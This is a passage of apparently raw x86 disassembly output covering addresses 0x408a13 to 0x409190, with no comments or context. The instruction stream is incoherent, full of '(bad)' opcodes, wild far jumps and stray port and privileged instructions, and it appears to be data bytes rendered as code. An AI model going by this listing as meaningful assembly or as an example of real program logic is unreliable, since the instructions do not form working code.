  408a13:	and    ah,0xd4
  408a16:	(bad)  
  408a17:	jge    0x408a05
  408a19:	lock xor eax,0x1d5c9e2e
  408a1f:	ds xchg esi,eax
  408a21:	pop    ds
  408a22:	xchg   esp,eax
  408a23:	pop    edx
  408a24:	sub    edx,DWORD PTR [edx]
  408a26:	popa   
  408a27:	and    al,0x12
  408a29:	dec    ebx
  408a2a:	out    dx,eax
  408a2b:	pop    edx
  408a2c:	push   edx
  408a2d:	out    0x27,al
  408a2f:	sub    ebx,ebp
  408a31:	xor    ecx,edi
  408a33:	cld    
  408a34:	jg     0x408a04
  408a36:	lods   eax,DWORD PTR ds:[esi]
  408a37:	fisub  DWORD PTR [ebx]
  408a39:	xchg   BYTE PTR [esi+0x7],dh
  408a3c:	nop
  408a3d:	jp     0x408a25
  408a3f:	jp     0x4089da
  408a41:	jle    0x408aa9
  408a43:	and    bh,BYTE PTR [ebp+ecx*4-0x2c4bc07c]
  408a4a:	stc    
  408a4b:	lds    eax,FWORD PTR [eax+0x34ee083]
  408a51:	sbb    BYTE PTR [ecx+0x34],0x76
  408a55:	xor    bl,BYTE PTR [ecx-0x18]
  408a58:	loop   0x408a7b
  408a5a:	and    DWORD PTR [ecx],0x13
  408a5d:	sbb    ebx,esi
  408a5f:	mov    ebx,0x3ec373ee
  408a64:	push   0x57
  408a66:	xor    DWORD PTR [ebp-0xb0ebfd6],edi
  408a6c:	cmp    DWORD PTR [ebx+esi*1-0x6c],ebx
  408a70:	push   ds
  408a71:	pop    edi
  408a72:	sub    BYTE PTR ds:[eax],ch
  408a75:	inc    ecx
  408a76:	out    dx,eax
  408a77:	out    0x7d,eax
  408a79:	sub    al,BYTE PTR ds:0xbcd7826f
  408a7f:	xor    DWORD PTR [esi],edx
  408a81:	ret    0x812d
  408a84:	in     al,dx
  408a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a86:	cmp    al,bh
  408a88:	jmp    0xf955:0xd79608d4
  408a8f:	fidivr WORD PTR [edi-0x5135281d]
  408a95:	test   DWORD PTR [eax],0x929268c2
  408a9b:	jnp    0x408a63
  408a9d:	push   esp
  408a9e:	das    
  408a9f:	xchg   edi,eax
  408aa0:	sar    bl,0x3c
  408aa3:	inc    BYTE PTR [esi+0x61]
  408aa6:	loopne 0x408af1
  408aa8:	mov    esp,0xd49d2bdd
  408aad:	sbb    al,cl
  408aaf:	mov    BYTE PTR [ebx+0x69],dh
  408ab2:	or     DWORD PTR [ebx+esi*4],ebp
  408ab5:	xor    bl,bl
  408ab7:	loope  0x408ab0
  408ab9:	aad    0xe4
  408abb:	shl    BYTE PTR [ebx-0x5f],cl
  408abe:	jle    0x408aaf
  408ac0:	dec    edi
  408ac1:	xor    eax,0x410c1a1d
  408ac6:	outs   dx,DWORD PTR ds:[esi]
  408ac7:	mov    bh,0xc7
  408ac9:	add    eax,0x1c56a52c
  408ace:	test   eax,0x2d1209d5
  408ad3:	mov    BYTE PTR [esi],cl
  408ad5:	bnd jno 0x408a9f
  408ad8:	repnz ins BYTE PTR es:[edi],dx
  408ada:	ret    0x460f
  408add:	xor    DWORD PTR [eax+0x5801e2e1],edi
  408ae3:	push   ss
  408ae4:	fdiv   st(2),st
  408ae6:	pushf  
  408ae7:	add    DWORD PTR [esi+0x2a],esi
  408aea:	imul   BYTE PTR [edx+0x66]
  408aed:	sbb    eax,0xfe493a51
  408af2:	leave  
  408af3:	or     bl,BYTE PTR [edi]
  408af5:	cwde   
  408af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408af7:	stos   DWORD PTR es:[edi],eax
  408af8:	bnd jo 0x408b29
  408afb:	hlt    
  408afc:	xchg   ecx,eax
  408afd:	jmp    0x408afe
  408aff:	das    
  408b00:	jne    0x408ac4
  408b02:	(bad)  
  408b04:	bound  ebx,QWORD PTR [edx+0x44]
  408b07:	sub    al,0x95
  408b09:	fld    QWORD PTR [ecx+0x1f]
  408b0c:	pop    ecx
  408b0d:	mov    BYTE PTR [eax],cl
  408b0f:	fadd   DWORD PTR [esi+0x40863980]
  408b15:	repz lea ebp,[edi+eax*1]
  408b19:	retf   0x191c
  408b1c:	sub    ah,bl
  408b1e:	xchg   edi,esp
  408b20:	jp     0x408acb
  408b22:	mov    dh,cl
  408b24:	fstp   QWORD PTR [ecx+0x6128b6c0]
  408b2a:	shl    al,cl
  408b2c:	call   0xec11979
  408b31:	cmp    al,0x9d
  408b33:	adc    al,0x62
  408b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b36:	xlat   BYTE PTR ds:[ebx]
  408b37:	mov    esp,0x4a0ad70d
  408b3c:	test   al,0xfc
  408b3e:	fnstenv [eax+0xdc3274a]
  408b44:	fist   WORD PTR [ebp-0x67c09278]
  408b4a:	loopne 0x408b88
  408b4c:	pusha  
  408b4d:	xchg   ebx,eax
  408b4e:	jb     0x408ba2
  408b50:	cmp    dh,ah
  408b52:	ffreep st(7)
  408b54:	cmp    eax,0x673951c9
  408b59:	pop    esp
  408b5a:	and    DWORD PTR [ebx],0xffffffc4
  408b5d:	mov    cl,0x27
  408b5f:	jne    0x408bd3
  408b61:	jno    0x408aef
  408b63:	jl     0x408bb8
  408b65:	ret    
  408b66:	daa    
  408b67:	leave  
  408b68:	jne    0x408b11
  408b6a:	jbe    0x408b24
  408b6c:	xor    al,BYTE PTR [ebx]
  408b6e:	aaa    
  408b6f:	adc    BYTE PTR [ecx],bh
  408b71:	cmc    
  408b72:	jnp    0x408b21
  408b74:	pop    esi
  408b75:	sbb    al,0x61
  408b78:	scas   eax,DWORD PTR es:[edi]
  408b79:	or     al,0xfe
  408b7b:	dec    ebx
  408b7c:	out    dx,eax
  408b7d:	sbb    eax,0x2b573d05
  408b82:	sbb    ebp,DWORD PTR [ebx]
  408b84:	lock mov bh,0xfb
  408b87:	and    DWORD PTR [esi],ebx
  408b89:	minps  xmm7,xmm5
  408b8c:	adc    edi,DWORD PTR [ebp+0x53697627]
  408b92:	inc    edx
  408b93:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b95:	test   ch,0x69
  408b98:	add    DWORD PTR [edi-0x78],ebx
  408b9b:	sahf   
  408b9c:	aam    0x25
  408b9e:	pop    ebx
  408b9f:	push   ss
  408ba0:	imul   esp,esp,0x3695e135
  408ba6:	leave  
  408ba7:	imul   esp,ebx,0xffffffcd
  408baa:	cmp    ah,bh
  408bac:	inc    ecx
  408bad:	xor    eax,0xfc462569
  408bb2:	jl     0x408be0
  408bb4:	loopne 0x408bf0
  408bb6:	fisttp QWORD PTR [ecx]
  408bb8:	jp     0x408b6c
  408bba:	mov    edx,0x34321d9d
  408bbf:	cwde   
  408bc0:	fsubr  st,st(3)
  408bc2:	(bad)  
  408bc3:	pop    ebp
  408bc4:	sbb    BYTE PTR [edx+0x12],cl
  408bc7:	cpuid  
  408bc9:	pusha  
  408bca:	dec    esi
  408bcb:	adc    BYTE PTR ds:0x50dcbe7a,0x6b
  408bd2:	cld    
  408bd3:	cmp    dh,BYTE PTR [eax-0x10b8ea38]
  408bd9:	sub    ah,cl
  408bdb:	lock fbld TBYTE PTR [edx]
  408bde:	xlat   BYTE PTR ds:[ebx]
  408bdf:	ret    
  408be0:	cdq    
  408be1:	fs fwait
  408be3:	or     DWORD PTR [esi+0x7ee381f7],esi
  408be9:	and    BYTE PTR [ebx],dh
  408beb:	mov    edi,0x155496c3
  408bf0:	call   0xf405eb3
  408bf5:	dec    ecx
  408bf6:	cmovbe edx,DWORD PTR [ecx-0x66]
  408bfa:	es daa 
  408bfc:	aaa    
  408bfd:	cld    
  408bfe:	mov    esi,0xf39de8df
  408c03:	pop    ebx
  408c04:	adc    ah,BYTE PTR [edi-0x6f]
  408c07:	push   edi
  408c08:	pop    ss
  408c09:	add    BYTE PTR ds:0xc76eef7a,bh
  408c0f:	pop    es
  408c10:	jmp    DWORD PTR [ecx-0x373c6451]
  408c16:	lock dec ebx
  408c18:	bound  esp,QWORD PTR [esi]
  408c1a:	sbb    ah,BYTE PTR [ecx]
  408c1c:	ret    0x42e0
  408c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c20:	inc    esi
  408c21:	ds inc edx
  408c23:	mov    ah,0xe
  408c25:	push   cs
  408c26:	or     edi,esp
  408c28:	jmp    FWORD PTR [eax+0x38]
  408c2b:	test   eax,0x7e768233
  408c31:	jae    0x408c14
  408c33:	outs   dx,DWORD PTR ds:[esi]
  408c34:	xor    al,0xb4
  408c36:	in     al,dx
  408c37:	repnz mov dl,0x1f
  408c3a:	inc    ebx
  408c3b:	js     0x408c78
  408c3d:	(bad)  
  408c3e:	ds push edx
  408c40:	sbb    DWORD PTR [ecx-0x5f021846],ebp
  408c46:	daa    
  408c47:	jne    0x408cb6
  408c49:	jmp    0x408c48
  408c4b:	jae    0x408c0c
  408c4d:	fwait
  408c4e:	and    eax,0xc5293540
  408c53:	int    0x9f
  408c55:	popf   
  408c56:	cmp    al,0x76
  408c58:	and    al,dl
  408c5a:	and    BYTE PTR [edx+0x32],al
  408c5d:	aas    
  408c5e:	hlt    
  408c5f:	das    
  408c60:	ret    
  408c61:	dec    edi
  408c62:	and    cl,BYTE PTR [eax-0x141d950f]
  408c68:	inc    ebx
  408c69:	push   edi
  408c6a:	mov    bh,0xf1
  408c6c:	cmp    al,bl
  408c6e:	cdq    
  408c6f:	xor    cl,bl
  408c71:	cld    
  408c72:	and    al,0x78
  408c74:	jl     0x408ccd
  408c76:	lea    esi,[ebx+edx*1+0x384490d3]
  408c7d:	jg     0x408cb0
  408c7f:	mov    edx,0x9fd42926
  408c84:	lds    esp,FWORD PTR [edi-0x4e5a3892]
  408c8a:	push   ebp
  408c8b:	or     dl,BYTE PTR ss:[esi+0x6a6f0599]
  408c92:	dec    ecx
  408c93:	scas   eax,DWORD PTR es:[edi]
  408c94:	push   ebp
  408c95:	and    eax,ebp
  408c97:	mov    ch,0x86
  408c99:	xchg   BYTE PTR [edi+0x5],dh
  408c9c:	add    al,BYTE PTR [ecx+0x5f54abe0]
  408ca2:	popa   
  408ca3:	push   ss
  408ca4:	push   DWORD PTR [edi+0x49]
  408ca7:	clc    
  408ca8:	pop    esp
  408ca9:	push   eax
  408caa:	sub    eax,0x593cd2b3
  408caf:	ins    BYTE PTR es:[edi],dx
  408cb0:	adc    ecx,edx
  408cb2:	xchg   edi,eax
  408cb3:	mov    ds:0x67d4ea58,al
  408cb8:	mov    esi,0xcab625f7
  408cbd:	mov    DWORD PTR [ecx+0x6d15db23],0x61f67521
  408cc7:	outs   dx,DWORD PTR ds:[esi]
  408cc8:	xchg   edi,eax
  408cc9:	mov    al,ds:0x7729128c
  408cce:	sub    dh,cl
  408cd0:	mov    esi,0x343eb1cf
  408cd5:	call   0xa4a4:0xe8d900a8
  408cdc:	push   esi
  408cdd:	sub    al,0x86
  408cdf:	jmp    FWORD PTR [esi]
  408ce1:	xchg   DWORD PTR [edx+0x60ae9855],ebp
  408ce7:	pop    esp
  408ce8:	fiadd  WORD PTR [ecx+0x55]
  408ceb:	mov    eax,ds:0x8efe4e01
  408cf0:	les    esp,FWORD PTR [ebx+0x3d252d47]
  408cf6:	push   ebx
  408cf7:	pop    edi
  408cf8:	fistp  WORD PTR [ebx-0x622b0e23]
  408cfe:	popf   
  408cff:	or     DWORD PTR [ebx+edx*8+0x77],0x504a651c
  408d07:	inc    edx
  408d08:	out    0x1d,eax
  408d0a:	leave  
  408d0b:	push   edi
  408d0c:	retf   
  408d0d:	pop    edx
  408d0e:	inc    edx
  408d0f:	retf   
  408d10:	lods   eax,DWORD PTR ds:[esi]
  408d11:	repnz out dx,al
  408d13:	mov    edx,0x5ba3a63a
  408d18:	sub    eax,0x2d1dbdce
  408d1d:	mov    al,0x1b
  408d1f:	int3   
  408d20:	mov    edx,0x6b79bd6b
  408d25:	popf   
  408d26:	call   0x32a5:0xfc883d4c
  408d2d:	xor    edx,DWORD PTR [eax+0x269b7819]
  408d33:	mov    ds:0x2f45d40b,eax
  408d38:	jb     0x408cfa
  408d3a:	jae    0x408db0
  408d3c:	ret    0xe7bd
  408d3f:	mov    dh,0x6b
  408d41:	jno    0x408d2a
  408d43:	ss loopne 0x408d3c
  408d46:	inc    edx
  408d47:	lods   eax,DWORD PTR ds:[esi]
  408d48:	outs   dx,BYTE PTR ds:[esi]
  408d49:	nop
  408d4a:	add    ch,BYTE PTR [esi]
  408d4c:	(bad)  
  408d4d:	push   esp
  408d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d4f:	jb     0x408d0d
  408d51:	into   
  408d52:	mov    esi,eax
  408d54:	pop    edi
  408d55:	inc    ebp
  408d56:	push   esp
  408d57:	inc    esi
  408d58:	adc    BYTE PTR [eax+esi*1-0x4a],0xbb
  408d5d:	push   ss
  408d5e:	aad    0xcb
  408d60:	cdq    
  408d61:	push   es
  408d62:	lahf   
  408d63:	cmp    eax,0x4b29cd95
  408d68:	aam    0x49
  408d6a:	mov    esi,esp
  408d6c:	sbb    BYTE PTR [ebp+ebx*1-0x39d1ff04],cl
  408d73:	push   edi
  408d74:	sar    DWORD PTR [ecx*4+0x61611588],cl
  408d7b:	sub    eax,0xbad8054d
  408d80:	mov    ebp,cs
  408d82:	push   ebx
  408d83:	dec    ecx
  408d84:	xchg   edi,eax
  408d85:	sub    ebp,DWORD PTR [ecx-0x15]
  408d88:	aad    0x84
  408d8a:	adc    al,0x68
  408d8c:	daa    
  408d8d:	and    DWORD PTR [edi],0x75
  408d90:	mov    edi,ebp
  408d92:	jle    0x408da8
  408d94:	stos   DWORD PTR es:[edi],eax
  408d95:	add    al,0xf3
  408d97:	cmp    ah,BYTE PTR [ecx-0x7ee15d1c]
  408d9d:	mov    edx,esi
  408d9f:	outs   dx,BYTE PTR ds:[esi]
  408da0:	jae    0x408ddc
  408da2:	push   0x20
  408da4:	sub    BYTE PTR [edi],0xde
  408da7:	xlat   BYTE PTR ds:[ebx]
  408da8:	call   0x84f5684c
  408dad:	jbe    0x408d6a
  408daf:	add    al,0x6
  408db1:	in     eax,dx
  408db2:	dec    ecx
  408db3:	les    esp,FWORD PTR [esi-0x2f01adfd]
  408db9:	stos   BYTE PTR es:[edi],al
  408dba:	out    dx,eax
  408dbb:	and    dh,ah
  408dbd:	mov    dh,0x54
  408dbf:	jno    0x408de4
  408dc1:	dec    ebp
  408dc2:	push   edi
  408dc3:	in     al,0x80
  408dc5:	je     0x408d71
  408dc7:	jnp    0x408e2a
  408dc9:	jl     0x408d69
  408dcb:	scas   al,BYTE PTR es:[edi]
  408dcc:	dec    esp
  408dcd:	push   ss
  408dce:	int    0xec
  408dd0:	push   eax
  408dd1:	daa    
  408dd2:	sbb    al,0xd2
  408dd4:	inc    edx
  408dd5:	xor    ebx,DWORD PTR [esi]
  408dd7:	sub    ah,BYTE PTR [ebp+edi*8-0x7a]
  408ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ddc:	rcl    BYTE PTR [edi-0x42],0xae
  408de0:	imul   ebx,esp,0xffffff9e
  408de3:	mov    ebx,0xc05b9837
  408de8:	jl     0x408e68
  408dea:	sub    DWORD PTR [ecx+edx*8],0x20c6a27b
  408df1:	adc    ah,0x5b
  408df4:	leave  
  408df5:	or     al,0x8b
  408df7:	outs   dx,BYTE PTR ds:[esi]
  408df8:	outs   dx,DWORD PTR ds:[esi]
  408df9:	daa    
  408dfa:	jae    0x408e24
  408dfc:	iret   
  408dfd:	test   DWORD PTR [esi+0x4],esp
  408e00:	dec    edx
  408e01:	fdiv   QWORD PTR [edx+esi*2-0x36d5eda0]
  408e08:	icebp  
  408e09:	mov    cs,WORD PTR [edi+0xc]
  408e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e0d:	pop    esi
  408e0e:	lahf   
  408e0f:	ins    BYTE PTR es:[edi],dx
  408e10:	test   al,0xc2
  408e12:	xchg   esp,eax
  408e13:	dec    edx
  408e14:	and    eax,0xfb44087c
  408e19:	or     BYTE PTR [ebp-0x49a3adff],0x35
  408e20:	rcr    bl,0x39
  408e23:	xor    al,0xa0
  408e25:	xchg   ebx,eax
  408e26:	and    BYTE PTR [ebx-0x7336f6a4],ch
  408e2c:	and    ebp,0x48717e4d
  408e32:	cwde   
  408e33:	loopne 0x408e32
  408e35:	mov    esi,0x7343ab6c
  408e3a:	xchg   esi,eax
  408e3b:	adc    ah,BYTE PTR [eax]
  408e3d:	jnp    0x408e0b
  408e3f:	(bad)  
  408e40:	push   0x6308da9f
  408e45:	inc    ebx
  408e46:	fbstp  TBYTE PTR [esi+0x39]
  408e49:	lock iret 
  408e4b:	outs   dx,BYTE PTR ds:[esi]
  408e4c:	fisubr WORD PTR [ecx+0x3a6271f7]
  408e52:	push   edx
  408e53:	mov    dh,0x8d
  408e55:	lods   eax,DWORD PTR ds:[esi]
  408e56:	fcomp  QWORD PTR [edi]
  408e58:	(bad)  
  408e59:	xchg   edx,eax
  408e5a:	sbb    BYTE PTR [edx-0x34ba2c1b],dl
  408e60:	pop    ecx
  408e61:	ins    BYTE PTR es:[edi],dx
  408e62:	inc    ebp
  408e63:	or     eax,0xbf66bb51
  408e68:	and    edi,DWORD PTR [edi+0xf]
  408e6b:	lods   al,BYTE PTR ds:[esi]
  408e6c:	rcl    DWORD PTR [eax-0x539622f3],1
  408e72:	fcmovb st,st(4)
  408e74:	call   0x91f4b361
  408e79:	add    eax,0xb02f0447
  408e7e:	add    al,0x91
  408e80:	jae    0x408e7e
  408e82:	stc    
  408e83:	lds    eax,FWORD PTR [edx]
  408e85:	mov    al,0x71
  408e87:	cmc    
  408e88:	or     eax,0xcf52aec6
  408e8d:	(bad)  
  408e8f:	leave  
  408e90:	or     eax,0x9a70d75
  408e95:	push   es
  408e96:	mov    dh,0x39
  408e98:	sti    
  408e99:	in     al,0x78
  408e9b:	mov    eax,0x5c4deea5
  408ea0:	dec    ebp
  408ea1:	sub    dl,ch
  408ea3:	jge    0x408eba
  408ea5:	dec    esp
  408ea6:	and    ebp,DWORD PTR [eax+0x3c]
  408ea9:	nop
  408eaa:	jp     0x408e5a
  408eac:	jns    0x408ed4
  408eae:	mov    fs,WORD PTR [esi]
  408eb0:	push   edx
  408eb1:	dec    esp
  408eb2:	xlat   BYTE PTR ds:[ebx]
  408eb3:	lods   al,BYTE PTR ds:[esi]
  408eb4:	stos   DWORD PTR es:[edi],eax
  408eb5:	mov    edx,0x3d2b68e
  408eba:	dec    edx
  408ebb:	or     ah,BYTE PTR [eax]
  408ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ebe:	mov    edx,0x9c88f20a
  408ec3:	fwait
  408ec4:	mov    esi,0x67cdff1e
  408ec9:	jmp    0x408f24
  408ecb:	out    0xdf,al
  408ecd:	clc    
  408ece:	cdq    
  408ecf:	mov    bl,0x9
  408ed1:	fiadd  DWORD PTR [esp+ebx*1+0x5d]
  408ed5:	push   edx
  408ed6:	xchg   ebp,eax
  408ed7:	outs   dx,BYTE PTR ds:[esi]
  408ed8:	mov    ds:0xa95e3e6,al
  408edd:	add    al,0x34
  408edf:	cmp    ch,ch
  408ee1:	dec    esp
  408ee2:	cli    
  408ee3:	outs   dx,DWORD PTR ds:[esi]
  408ee4:	nop
  408ee5:	test   BYTE PTR [esi+0x11c2c677],bl
  408eeb:	(bad)
  408eee:	xchg   ebx,eax
  408eef:	xor    eax,0x90875738
  408ef4:	push   0x3473f483
  408ef9:	and    eax,0xf6936af6
  408efe:	add    bl,al
  408f00:	ins    BYTE PTR es:[edi],dx
  408f01:	add    esp,DWORD PTR [edi-0x22]
  408f04:	or     BYTE PTR [ecx+eax*2-0x7b49062a],0x70
  408f0c:	mov    bh,0xbe
  408f0e:	fild   QWORD PTR [esi]
  408f10:	jp     0x408f03
  408f12:	xchg   edi,eax
  408f13:	out    dx,al
  408f14:	bound  esi,QWORD PTR [ebp-0x5512ab6d]
  408f1a:	xor    bh,bh
  408f1c:	scas   eax,DWORD PTR es:[edi]
  408f1d:	pusha  
  408f1e:	(bad)  
  408f1f:	mov    ds:0xe1e23f59,eax
  408f24:	adc    bh,BYTE PTR [ebp-0x6880d0e4]
  408f2a:	daa    
  408f2b:	pushf  
  408f2c:	js     0x408f39
  408f2e:	jno    0x408f95
  408f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f31:	and    DWORD PTR [eax],0x2978e541
  408f37:	(bad)  
  408f38:	jmp    0x408fb5
  408f3a:	or     ebp,DWORD PTR [esi]
  408f3c:	sub    bl,dh
  408f3e:	(bad)  
  408f3f:	jmp    0xe52:0x59c1c6aa
  408f46:	and    al,0x77
  408f48:	repnz stos BYTE PTR es:[edi],al
  408f4a:	imul   sp,WORD PTR [edx],0xffd8
  408f4e:	popf   
  408f4f:	sahf   
  408f50:	mov    al,0x9f
  408f52:	dec    edi
  408f53:	pop    edi
  408f54:	(bad)  
  408f55:	ins    DWORD PTR es:[edi],dx
  408f56:	mov    dl,0xc7
  408f58:	jae    0x408f4b
  408f5a:	call   0xb8931e50
  408f5f:	std    
  408f60:	push   ebx
  408f61:	add    BYTE PTR [ecx-0x1df505c],cl
  408f67:	sub    al,0x22
  408f69:	(bad)  
  408f6a:	push   edi
  408f6b:	clc    
  408f6c:	pop    edi
  408f6d:	add    ebp,edx
  408f6f:	dec    esp
  408f70:	bound  eax,QWORD PTR [ebx-0x39]
  408f73:	sbb    ebp,DWORD PTR [ebp+0x41]
  408f76:	popf   
  408f77:	dec    edx
  408f78:	loope  0x408fac
  408f7a:	sub    DWORD PTR [ebx-0x33c9405],0xffffffa8
  408f81:	ss clc 
  408f83:	into   
  408f84:	jmp    0x408f6b
  408f86:	jb     0x408f89
  408f88:	cmovg  ebx,DWORD PTR [eax]
  408f8b:	sbb    BYTE PTR [edi],cl
  408f8d:	aaa    
  408f8e:	bound  eax,QWORD PTR [eax-0x6fb944c6]
  408f94:	data16 mov cl,0x26
  408f97:	lahf   
  408f98:	hlt    
  408f99:	imul   esp,DWORD PTR [ebx],0xffffffa2
  408f9c:	cli    
  408f9d:	mov    bl,0xc7
  408f9f:	or     eax,0xc651c994
  408fa4:	sub    dl,bl
  408fa6:	pop    esp
  408fa7:	xor    DWORD PTR [eax],0xffffffda
  408faa:	scas   al,BYTE PTR es:[edi]
  408fab:	rcr    DWORD PTR [esi],cl
  408fad:	out    dx,al
  408fae:	icebp  
  408faf:	cmp    eax,DWORD PTR [edi]
  408fb1:	cmc    
  408fb2:	dec    esi
  408fb3:	sbb    ebx,ebx
  408fb5:	push   edx
  408fb6:	jno    0x408f78
  408fb8:	sbb    bl,BYTE PTR [esi]
  408fba:	and    ecx,edx
  408fbc:	adc    BYTE PTR [ebx],bh
  408fbe:	dec    ebp
  408fbf:	fimul  WORD PTR [eax+0x6c0a13c8]
  408fc5:	and    DWORD PTR [edx+0x5],ebx
  408fc8:	aaa    
  408fc9:	xchg   edi,eax
  408fca:	jns    0x408f54
  408fcc:	xchg   esp,eax
  408fcd:	add    al,al
  408fcf:	mov    ch,0x15
  408fd1:	fst    st(3)
  408fd3:	push   0xffffffdb
  408fd5:	push   ebp
  408fd6:	loop   0x40904b
  408fd8:	sub    eax,esp
  408fda:	add    al,0x38
  408fdc:	sbb    cl,ah
  408fde:	fistp  DWORD PTR [ebp+0x43]
  408fe1:	mov    dh,0x9c
  408fe3:	ficomp DWORD PTR [edi]
  408fe5:	xchg   ecx,eax
  408fe6:	mov    bl,bh
  408fe8:	sbb    eax,0x4f478527
  408fed:	cld    
  408fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fef:	push   cs
  408ff0:	jne    0x408f8e
  408ff2:	out    0x51,al
  408ff4:	sub    eax,0x3e1231cf
  408ff9:	and    DWORD PTR [esp+ecx*4],esp
  408ffc:	out    dx,al
  408ffd:	stos   DWORD PTR es:[edi],eax
  408ffe:	je     0x409063
  409000:	cld    
  409001:	idiv   BYTE PTR [esi+0x11e4c9bd]
  409007:	test   al,0x96
  409009:	push   cs
  40900a:	cmc    
  40900b:	mov    bh,0x94
  40900d:	fidivr WORD PTR [edx]
  40900f:	js     0x409034
  409011:	or     BYTE PTR [edx],0x54
  409014:	pop    esi
  409015:	add    BYTE PTR es:[edx-0x5830a96e],cl
  40901c:	call   0x3f9fad78
  409021:	ds jmp 0x408fe8
  409024:	bound  eax,QWORD PTR [edx+ecx*8-0x700bd5f5]
  40902b:	jmp    0x22ee:0xe613e27b
  409032:	jae    0x409073
  409034:	cdq    
  409035:	jmp    0x77e13505
  40903a:	dec    edx
  40903b:	fist   DWORD PTR [ebp+0x64]
  40903e:	push   ebp
  40903f:	pop    esp
  409040:	jnp    0x409022
  409042:	sahf   
  409043:	sti    
  409044:	mov    dh,0x38
  409046:	cmp    ah,BYTE PTR [esi-0x7b]
  409049:	sub    DWORD PTR [edi],edx
  40904b:	mov    edx,0xd85c3c63
  409050:	pop    esi
  409051:	pop    esi
  409052:	adc    BYTE PTR [edx-0x1d],0x91
  409056:	lock ss jmp 0x2f5cd5
  40905d:	or     al,0x66
  40905f:	addr16 mov ecx,0x40744302
  409065:	rcr    DWORD PTR [ebp+esi*2+0x5b],1
  409069:	call   0xbed:0xc2a89df9
  409070:	push   esp
  409071:	jecxz  0x4090ef
  409073:	inc    edi
  409074:	xor    DWORD PTR [ecx-0x49],edx
  409077:	(bad)  
  409078:	inc    esi
  409079:	mov    dl,0x6f
  40907b:	mov    ebp,0xaab08aea
  409080:	pusha  
  409081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409082:	clc    
  409083:	push   edx
  409084:	cwde   
  409085:	sbb    DWORD PTR [edi],ecx
  409087:	addr16 xchg edi,edx
  40908a:	dec    esi
  40908b:	mul    BYTE PTR [edx+edi*8-0x53852493]
  409092:	xchg   esi,eax
  409093:	mov    esi,0x45e28bac
  409098:	hlt    
  409099:	sahf   
  40909a:	dec    ecx
  40909b:	popf   
  40909c:	ret    0x57b3
  40909f:	shr    DWORD PTR ds:0x2f0564b0,1
  4090a5:	inc    ecx
  4090a6:	pusha  
  4090a7:	call   0x2fba:0x4bdb2500
  4090ae:	mov    edx,0x2baf258d
  4090b3:	sub    eax,0x3d5701fc
  4090b8:	sbb    eax,0xe3f18c55
  4090bd:	xor    esi,esp
  4090bf:	and    BYTE PTR [esi],ch
  4090c1:	ins    BYTE PTR es:[edi],dx
  4090c2:	jg     0x4090c6
  4090c4:	sub    eax,0xa9ec43fa
  4090c9:	jp     0x409133
  4090cb:	stos   DWORD PTR es:[edi],eax
  4090cc:	pusha  
  4090cd:	mov    al,ds:0x39671653
  4090d2:	sbb    cl,BYTE PTR [eax+0x1c]
  4090d5:	pushf  
  4090d6:	pop    esi
  4090d7:	pop    ds
  4090d8:	int3   
  4090d9:	xchg   ebp,eax
  4090da:	int3   
  4090db:	ins    DWORD PTR es:[edi],dx
  4090dc:	aas    
  4090dd:	add    bh,BYTE PTR [edx+0x7a9a450e]
  4090e3:	(bad)  
  4090e5:	lgs    edx,FWORD PTR [ecx+0x4b4446d]
  4090ec:	fisubr WORD PTR [eax+0x18]
  4090ef:	aad    0x52
  4090f1:	add    cl,BYTE PTR [ebp-0x1c]
  4090f4:	lds    esp,FWORD PTR [ebx+0x30]
  4090f7:	push   ecx
  4090f8:	or     BYTE PTR [ebp+0xf075230],ch
  4090fe:	fdivrp st(0),st
  409100:	hlt    
  409101:	adc    esi,DWORD PTR [esi+0x10]
  409104:	sub    al,0xa8
  409106:	xor    DWORD PTR [edi+0x5],ecx
  409109:	pop    eax
  40910a:	out    dx,al
  40910b:	mov    ebp,DWORD PTR [ebx]
  40910d:	push   edi
  40910e:	inc    eax
  40910f:	out    0x52,al
  409111:	push   gs
  409113:	push   es
  409114:	add    DWORD PTR [edx-0x1f26abbf],edi
  40911a:	adc    DWORD PTR [edx],esp
  40911c:	int    0x6
  40911e:	imul   ebx,DWORD PTR ds:0xd8fa4c7e,0x70bd0434
  409128:	scas   eax,DWORD PTR es:[edi]
  409129:	stc    
  40912a:	les    ecx,FWORD PTR [edi]
  40912c:	inc    esi
  40912d:	ins    BYTE PTR es:[edi],dx
  40912e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40912f:	sub    cl,BYTE PTR [ecx-0x21]
  409132:	loope  0x4090ff
  409134:	pop    edx
  409135:	cdq    
  409136:	leave  
  409137:	scas   eax,DWORD PTR es:[edi]
  409138:	hlt    
  409139:	addr16 sbb al,0xe6
  40913c:	jl     0x4090cb
  40913e:	(bad)  
  40913f:	fidiv  DWORD PTR [edi-0x21dd50d4]
  409145:	xor    eax,0x1fa210a0
  40914a:	cli    
  40914b:	rol    dh,1
  40914d:	(bad)  
  40914e:	pop    ebx
  40914f:	xchg   ebx,eax
  409150:	popf   
  409151:	mov    BYTE PTR [esi+edi*4+0x41],bh
  409155:	jns    0x409105
  409157:	dec    edi
  409159:	outs   dx,DWORD PTR ds:[esi]
  40915a:	mov    ch,0x3d
  40915c:	adc    DWORD PTR [ecx+0x5c],ebx
  40915f:	imul   esi,DWORD PTR [ebp-0x3b4b68ed],0x31bda3ef
  409169:	dec    edx
  40916a:	scas   eax,DWORD PTR es:[edi]
  40916b:	pop    esi
  40916c:	in     al,dx
  40916d:	push   0x66
  40916f:	stos   DWORD PTR es:[edi],eax
  409170:	enter  0xd719,0xf9
  409174:	xchg   edi,eax
  409175:	push   0xffffffee
  409177:	jle    0x40919a
  409179:	adc    DWORD PTR [ebp+0xa327623],edi
  40917f:	cs sub eax,0x2b6cf1d8
  409185:	int    0x4d
  409187:	adc    edx,DWORD PTR [ebx+0x36]
  40918a:	shl    DWORD PTR [edi-0x3b02f25d],cl
  409190:	dec    esi
